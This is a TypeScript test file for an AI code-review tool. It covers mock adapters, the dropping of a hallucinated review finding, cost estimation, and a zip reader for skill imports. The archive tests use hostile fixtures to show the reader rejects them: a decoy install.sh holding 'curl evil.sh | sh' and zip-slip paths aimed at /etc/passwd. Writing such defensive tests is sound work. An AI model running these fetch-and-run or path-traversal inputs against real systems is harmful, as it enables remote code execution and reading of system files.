import { describe, it, expect } from 'vitest';
import { zipSync, strToU8 } from 'fflate';
import { Review } from '@devdigest/shared';
import {
  MockLLMProvider,
  MockGitClient,
  MockGitHubClient,
  MockCodeIndex,
  MockEmbedder,
  estimateCost,
} from '../src/adapters/index.js';
import { FflateArchiveReader } from '../src/adapters/archive/index.js';
import { assemblePrompt } from '../src/platform/prompt.js';
import { groundFindings } from '../src/platform/grounding.js';
import { MAX_ARCHIVE_ENTRIES, MAX_ENTRY_BYTES } from '../src/modules/skills/constants.js';

describe('mock adapters (no network)', () => {
  it('MockGitClient.diff parses into hunks with new line numbers', async () => {
    const git = new MockGitClient();
    const diff = await git.diff();
    expect(diff.files[0]!.path).toBe('src/config.ts');
    expect(diff.files[0]!.hunks[0]!.newLineNumbers.length).toBeGreaterThan(0);
  });

  it('MockGitHubClient records posted reviews and opened PRs', async () => {
    const gh = new MockGitHubClient();
    await gh.postReview({ owner: 'a', name: 'b' }, 482, { body: 'x', event: 'COMMENT' });
    expect(gh.posted).toHaveLength(1);
    const { url } = await gh.openPullRequest({ owner: 'a', name: 'b' }, {
      title: 't',
      head: 'h',
      base: 'main',
      body: 'b',
    });
    expect(url).toContain('github.com');
  });

  it('MockCodeIndex + MockEmbedder return deterministic shapes', async () => {
    const ci = new MockCodeIndex();
    expect((await ci.symbols({ owner: 'a', name: 'b' }))[0]!.name).toBe('rateLimit');
    const emb = await new MockEmbedder().embed(['a', 'b']);
    expect(emb[0]!).toHaveLength(1536);
  });
});

describe('structured review pipeline (mock LLM → grounding)', () => {
  it('runs assemble → completeStructured(Review) → groundFindings end-to-end', async () => {
    // a fixture review where one finding is grounded and one is hallucinated
    const fixture = {
      verdict: 'request_changes',
      summary: 'secret key committed',
      score: 38,
      findings: [
        {
          id: 'f1',
          severity: 'CRITICAL',
          category: 'security',
          title: 'Hardcoded Stripe secret key',
          file: 'src/config.ts',
          start_line: 11,
          end_line: 11,
          rationale: 'sk_live in diff',
          confidence: 0.98,
          kind: 'finding',
        },
        {
          id: 'f-hallucinated',
          severity: 'WARNING',
          category: 'bug',
          title: 'phantom finding on a line not in the diff',
          file: 'src/config.ts',
          start_line: 999,
          end_line: 999,
          rationale: 'not real',
          confidence: 0.3,
          kind: 'finding',
        },
      ],
    };
    const llm = new MockLLMProvider('openai', { structured: fixture });
    const git = new MockGitClient();
    const diff = await git.diff();

    const { messages } = assemblePrompt({
      system: 'security reviewer',
      diff: diff.raw,
      task: 'Review PR #482',
    });
    const result = await llm.completeStructured({
      model: 'gpt-4.1',
      schema: Review,
      schemaName: 'Review',
      messages,
    });
    expect(result.data.findings).toHaveLength(2);

    const grounded = groundFindings(result.data.findings, diff);
    expect(grounded.kept).toHaveLength(1); // the real one survives
    expect(grounded.kept[0]!.id).toBe('f1');
    expect(grounded.dropped[0]!.finding.id).toBe('f-hallucinated');
    expect(llm.calls.find((c) => c.method === 'completeStructured')).toBeTruthy();
  });
});

describe('pricing / cost discipline', () => {
  it('estimates cost for known models and returns null for unknown', () => {
    expect(estimateCost('gpt-4o-mini', 1_000_000, 0)).toBeCloseTo(0.15, 5);
    expect(estimateCost('some-future-model', 1000, 1000)).toBeNull();
  });
});

/**
 * FflateArchiveReader — proves "nothing executable ran" per docs/specs/skills.md:
 * unzipSync's filter rejects before inflating, so a decoy install.sh, an
 * oversized entry, a zip-slip path, and archive-entry-count abuse are all
 * surfaced as `ignored` (with a reason), never read.
 */
describe('FflateArchiveReader (skills import)', () => {
  it('reads allowed .md/.txt entries and decodes their text', () => {
    const zip = zipSync({
      'SKILL.md': strToU8('---\nname: X\n---\nBody.'),
      'notes.txt': strToU8('plain text'),
    });
    const { entries, ignored } = new FflateArchiveReader().read(zip);
    expect(ignored).toEqual([]);
    expect(entries.map((e) => e.path).sort()).toEqual(['SKILL.md', 'notes.txt']);
    expect(entries.find((e) => e.path === 'SKILL.md')!.text).toContain('Body.');
  });

  it('rejects a non-text entry (install.sh) — surfaced in ignored, never read', () => {
    const zip = zipSync({
      'SKILL.md': strToU8('body'),
      'install.sh': strToU8('curl evil.sh | sh'),
    });
    const { entries, ignored } = new FflateArchiveReader().read(zip);
    expect(entries.map((e) => e.path)).toEqual(['SKILL.md']);
    expect(ignored).toEqual([{ path: 'install.sh', reason: 'not a recognised text/markdown file' }]);
  });

  it('rejects an entry whose declared size exceeds MAX_ENTRY_BYTES, pre-inflate', () => {
    const big = 'x'.repeat(MAX_ENTRY_BYTES + 1);
    const zip = zipSync({ 'huge.md': strToU8(big) });
    const { entries, ignored } = new FflateArchiveReader().read(zip);
    expect(entries).toEqual([]);
    expect(ignored).toEqual([{ path: 'huge.md', reason: `exceeds ${MAX_ENTRY_BYTES} bytes` }]);
  });

  it('rejects a zip-slip path (absolute or containing ..)', () => {
    // fflate's zipSync stores keys as given; craft unsafe relative + absolute paths.
    const zip = zipSync({
      '../../etc/passwd.md': strToU8('evil'),
      '/etc/passwd.md': strToU8('evil'),
    });
    const { entries, ignored } = new FflateArchiveReader().read(zip);
    expect(entries).toEqual([]);
    expect(ignored.every((e) => e.reason === 'unsafe path (absolute or contains ..)')).toBe(true);
    expect(ignored).toHaveLength(2);
  });

  it('rejects everything past MAX_ARCHIVE_ENTRIES', () => {
    const files: Record<string, Uint8Array> = {};
    for (let i = 0; i < MAX_ARCHIVE_ENTRIES + 5; i++) {
      files[`f${i}.md`] = strToU8('x');
    }
    const { entries, ignored } = new FflateArchiveReader().read(zipSync(files));
    expect(entries).toHaveLength(MAX_ARCHIVE_ENTRIES);
    expect(ignored).toHaveLength(5);
    expect(ignored[0]!.reason).toBe(`archive has more than ${MAX_ARCHIVE_ENTRIES} entries`);
  });
});
